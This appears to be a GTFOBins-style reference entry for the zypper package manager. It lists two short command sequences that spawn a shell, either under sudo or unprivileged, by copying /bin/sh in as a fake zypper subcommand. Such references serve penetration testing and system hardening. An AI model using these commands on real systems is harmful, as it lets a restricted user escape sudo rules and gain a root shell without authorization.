title: zypper
html:
zypper

Shell

Context: sudo, unprivileged

cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x

Context: sudo, unprivileged

cp /bin/sh /path/to/temp-dir/zypper-x
PATH=$PATH:/path/to/temp-dir/ zypper x
excerpt: zypper Shell Context: sudo, unprivileged cp /bin/sh /usr/lib/zypper/commands/zypper-x zypper x Context: sudo, unprivileged cp /bin/sh /path/to/temp-dir/zypper-x PATH=$PATH:/path/to/temp-dir/ zypper x
